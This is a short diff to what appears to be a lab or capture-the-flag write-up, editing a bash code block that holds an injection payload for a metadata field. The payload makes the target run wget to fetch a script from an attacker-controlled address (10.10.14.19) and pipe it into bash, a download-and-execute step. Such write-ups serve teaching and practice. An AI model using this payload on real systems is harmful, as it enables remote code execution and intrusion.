@@ -423,7 +423,7 @@ To do so, we `repeat` all the previous `proccess` but with the only `difference`
 <br />
 
 ```bash
-echo '(metadata "\c${system('wget -qO- http://10.10.14.19/index.html | bash')};")' > payload.txt
+(metadata "\c${system('wget -qO- http://10.10.14.19/index.html | bash')};")
 ```
 
 <br />
